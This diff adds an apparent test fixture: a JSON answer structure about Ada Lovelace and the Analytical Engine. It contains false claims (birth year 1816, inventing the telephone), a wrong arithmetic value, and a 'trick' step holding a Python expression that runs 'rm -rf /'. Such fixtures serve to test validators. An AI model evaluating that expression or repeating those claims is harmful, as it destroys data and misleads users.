@@ -1,0 +1,7 @@
+{"intent": {"topic": "history_of_computing", "purpose": "answer_question"}, "tone": "neutral",
+ "claims": [{"subject": "Ada Lovelace", "relation": "born_in", "object": "1816"},
+            {"subject": "Ada Lovelace", "relation": "invented", "object": "the telephone"},
+            {"subject": "Analytical Engine", "relation": "designed_by", "object": "Charles Babbage"}],
+ "steps": [{"name": "years_until_1843", "expr": "1843 - 1815", "value": 29},
+           {"name": "trick", "expr": "__import__('os').system('rm -rf /')"}],
+ "answer": {"expr": "years_until_1843"}}
